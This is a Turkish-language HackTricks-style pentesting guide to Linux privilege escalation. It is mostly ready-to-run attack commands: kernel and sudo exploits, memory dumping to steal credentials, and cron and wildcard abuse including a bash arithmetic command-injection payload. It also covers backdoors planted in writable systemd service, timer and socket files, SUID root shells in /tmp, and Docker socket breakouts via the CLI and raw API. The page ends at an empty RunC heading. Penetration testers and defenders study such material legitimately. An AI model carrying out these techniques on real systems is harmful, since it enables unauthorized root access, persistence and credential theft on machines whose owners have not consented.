# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgisi

### OS bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer `PATH` değişkenindeki herhangi bir klasöre **yazma izniniz** varsa bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, şifreler veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını araştırın.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits** şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer bazı **compiled exploits** bulabileceğiniz siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Söz konusu siteden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploit'lerini aramak için yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürüm

Aşağıdaki listede görünen kırılgan Sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün zafiyetli olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu vuln'ün nasıl exploited olabileceğine dair bir **örnek** için **smasher2 box of HTB**'yi kontrol edin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, buradan kaçmayı deneyebilirsiniz:

{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Nelerin **mounted** ve **unmounted** olduğunu, nerede ve nedenini kontrol edin. Eğer herhangi bir şey **unmounted** ise, mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin kurulup kurulmadığını** kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekirse faydalıdır çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Güvenliğe Açık Yazılımlar Yüklü

Yüklü paketlerin ve servislerin **sürümünü** kontrol edin. Belki, örneğin, eski bir Nagios sürümü olabilir; bu sürüm escalating privileges için exploited edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayacak çok fazla bilgi göstereceğini unutmayın; bu nedenle yüklü herhangi bir yazılım sürümünün bilinen exploits için savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir._

## İşlemler

**Hangi işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin **gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin tomcat'in root tarafından mı çalıştırıldığını kontrol edin?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Süreç izleme

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Süreç belleği

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm süreçler debug edilebilir. Bu ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE capability gerektirir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptracing'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps**, o işlemin sanal adres uzayında belleğin nasıl eşlendiğini gösterir; ayrıca her eşlenen bölgenin **izinlerini** listeler. **mem** pseudo dosyası **işlemin belleğinin kendisini** açığa çıkarır. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların offset'lerini öğreniriz. Bu bilgiyi kullanarak **mem** dosyasında konumlanır (seek) ve okunabilir tüm bölgeleri bir dosyaya dump ederiz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubunca okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux için ProcDump

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. İndirmek için [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait olan işlemi dökebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator process çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (önceki bölümlere bakın; bir process'in memory'sini dump etmenin farklı yollarını bulabilirsiniz) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekteki **düz metin kimlik bilgilerini** ve bazı **bilinen dosyalardaki** kimlik bilgilerini çalacaktır. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işler

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, SSH local port-forwarding ile yine ona ulaşabilir ve yükseltme için ayrıcalıklı bir job oluşturabilirsiniz.

Tipik zincir
- Loopback-only port'u (örn., 127.0.0.1:8000) ve Basic-Auth realm'i `ss -ntlp` / `curl -v localhost:8000` ile keşfet
- Kimlik bilgilerini operasyonel artefaktlarda bul:
- Yedekler/scriptler içinde `zip -P <password>`
- systemd birimi `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkarıyor
- Tünel aç ve giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle kısıtlayın
- localhost'a bağlayın ve ek olarak firewall/VPN ile erişimi kısıtlayın; parolaları yeniden kullanmayın
- Gizli bilgileri unit files içine gömmekten kaçının; secret stores veya sadece root erişimli EnvironmentFile kullanın
- İsteğe bağlı iş yürütmeleri için audit/logging etkinleştirin

Herhangi bir zamanlanmış görevin zafiyeti olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i şu şekilde bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma izinlerine sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcı PATH'ı ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman şu şekilde bir root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron'un wildcard içeren bir script ile kullanımı (Wildcard Injection)

Eğer root tarafından çalıştırılan bir script'in bir komutunun içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için istismar edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun önünde ise, örneğin** _**/some/path/\***_ **, zafiyet yoktur (hatta** _**./\***_ **da yoktur).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içinde aritmetik değerlendirmeden önce parameter expansion ve command substitution uygular. Eğer root cron/parser güvensiz log alanlarını okuyup bunları bir aritmetik bağlama besliyorsa, bir saldırgan cron çalıştığında root olarak çalışacak bir command substitution $(...) enjekte edebilir.

- Neden işe yarar: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), sonra geriye kalan sayısal `0` aritmetikte kullanılır ve script hata olmadan devam eder.

- Tipik zafiyetli örnek:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Sömürme: Ayrıştırılan loga saldırgan kontrollü metin yazdırın, böylece sayısal görünen alan bir command substitution içerir ve bir rakamla biter. Komutunuzun stdout'a yazmamasını sağlayın (veya çıktıyı yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir **cron script**'ini değiştirebiliyorsanız, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script, tam erişiminizin olduğu bir **directory** kullanıyorsa, o folder'ı silmek ve sizin kontrolünüzde bir script sunan başka bir yere işaret eden bir **symlink folder** oluşturmak faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık çalışan cron jobs

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri arayabilirsiniz. Belki bundan faydalanıp yetki yükseltme yapabilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede izle**, **daha az çalıştırılan komutlara göre sırala** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Bir yorumdan sonra **carriage return koyarak** (yeni satır karakteri olmadan) bir cronjob oluşturmak mümkündür ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin, eğer yazabiliyorsanız, onu **değiştirerek** backdoor'unuzun servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **çalışmasını** sağlayabilirsiniz (muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir).\
Örneğin backdoor'unuzu .service dosyasının içine **`ExecStart=/tmp/script.sh`**

### Yazılabilir servis ikili dosyaları

Unutmayın ki eğer **servisler tarafından çalıştırılan ikili dosyalar (binaries) üzerinde yazma izniniz** varsa, bunları backdoor'lar için değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında backdoor'lar da çalıştırılacaktır.

### systemd PATH - Göreli Yollar

systemd tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasöründe **yazma** yapabildiğinizi fark ederseniz, **escalate privileges** yapabiliyor olabilirsiniz. Servis yapılandırma dosyalarında **göreli yolların kullanılıp kullanılmadığını** aramanız gerekir, örneğin:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörünün içine, **göreli yol binary'si ile aynı ada sahip bir executable** oluşturun; servis kırılgan eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor**'unuz çalıştırılacaktır (yetkisiz kullanıcılar genellikle servisleri başlatma/durdurma yetkisine sahip değildir; ancak `sudo -l` kullanıp kullanamadığınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service`'e bakın.**

## **Timers**

**Timers**, adı `**.timer**` ile biten systemd unit dosyalarıdır ve `**.service**` dosyalarını veya olayları kontrol eder. **Timers**, takvim zamanlı olaylar ve monotonik zamanlı olaylar için yerleşik destek sağladıkları ve asenkron olarak çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm timer birimlerini şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir timer'ı değiştirebiliyorsanız, systemd.unit içindeki mevcut öğeleri (ör. `.service` veya `.target`) çalıştıracak şekilde ayarlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şu şekilde açıklanıyor:

> Bu zamanlayıcı sona erdiğinde etkinleştirilecek unit. Argüman, son eki not ".timer" olan bir unit adıdır. Belirtilmemişse, bu değer varsayılan olarak zamanlayıcı unit'iyle aynı ada sahip olan, sadece son eki farklı bir service olarak ayarlanır. (Yukarıya bakınız.) Etkinleştirilen unit adı ile zamanlayıcı unit adı, son ek dışında aynı şekilde adlandırılmaları tavsiye edilir.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- Bazı systemd unit'leri (ör. `.service`) bulun; bunlar **yazılabilir bir ikili dosyayı çalıştırıyor**.
- Bir systemd unit'i bulun; bu unit **göreli bir yol (relative path) çalıştırıyor** ve sizin **systemd PATH** üzerinde **yazma ayrıcalıklarınız** var (o yürütülebilir dosyayı taklit etmek için).

**Zamanlayıcılar hakkında daha fazla bilgi için `man systemd.timer`'a bakın.**

### **Zamanlayıcıyı Etkinleştirme**

Bir zamanlayıcıyı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketler

Unix Domain Sockets (UDS) client-server modellerinde aynı veya farklı makinelerde **süreçler arası iletişimi** sağlar. Bunlar bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılır.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Learn more about sockets with `man systemd.socket`.** Bu dosya içinde çeşitli ilginç parametreler yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özet olarak **socket'in nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve sadece bağlantı soketi ona iletilir. Eğer **false** ise, tüm dinleme soketleri kendileri **başlatılan service unit'e iletilir**, ve tüm bağlantılar için sadece bir service unit oluşturulur. Bu değer, tek bir service unit'un koşulsuz olarak tüm gelen trafiği işlediği datagram soketleri ve FIFO'larda göz ardı edilir. **Varsayılan: false.** Performans nedenleriyle yeni daemonların `Accept=no` için uygun olacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinleme **sockets**/FIFO'ları **oluşturulmadan** ve bağlanmadan **önce** veya **sonra** **çalıştırılır**. Komut satırının ilk token'ı mutlak bir dosya adı olmalı, ardından süreç için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'ları kapatılmadan ve kaldırılmadan önce veya sonra sırasıyla **çalıştırılan** ek **komutlar**.
- `Service`: Gelen trafik üzerinde **aktive edilecek** **service** unit adını belirtir. Bu ayar sadece Accept=no olan soketler için izinlidir. Varsayılan olarak, soketle aynı isme sahip servise işaret eder (ek takısı değiştirilmiş şekilde). Çoğu durumda bu seçeneğin kullanılması gerekli değildir.

### Yazılabilir .socket dosyaları

Eğer bir **yazılabilir** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.\
_Not: Sistem bu socket dosyası yapılandırmasını kullanıyor olmalı, aksi takdirde backdoor çalıştırılmaz_

### Yazılabilir soketler

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_şimdi bahsettiğimiz Unix Sockets ve config `.socket` dosyaları değil_), o soketle **iletişim kurabilir** ve belki de exploit a vulnerability.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **sockets** HTTP isteklerini dinliyor olabilir (_.socket dosyalarından değil, unix sockets olarak işlev gören dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **responds with an HTTP** request ise, onunla **communicate** edebilir ve belki **exploit some vulnerability** yapabilirsiniz.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunur; güvence altına alınması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e write access sahip olmak privilege escalation'a yol açabilir. Bunun nasıl yapılabileceğinin bir dökümü ve Docker CLI mevcut değilse alternatif yöntemler aşağıdadır.

#### **Privilege Escalation with Docker CLI**

Eğer Docker socket'e write access'iniz varsa, aşağıdaki komutları kullanarak escalate privileges yapabilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root seviyesinde erişimi olan bir konteyner çalıştırmanıza izin verir.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI mevcut olmadığında bile, Docker socket Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir görüntülerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin kök dizinini mount eden bir konteyner oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Oluşturulan konteyneri başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak konteynere bağlantı kurun; bu, içinde komut çalıştırmayı sağlar.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host dosya sistemine root seviyesinde erişime sahip olarak konteyner içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

Unutmayın, eğer docker socket üzerinde yazma izinleriniz varsa çünkü **`docker` grubunun içindeyseniz** [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Docker'dan çıkmak veya docker'ı kötüye kullanarak ayrıcalıkları yükseltmek için **more ways to break out from docker or abuse it to escalate privileges** bölümüne bakın:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

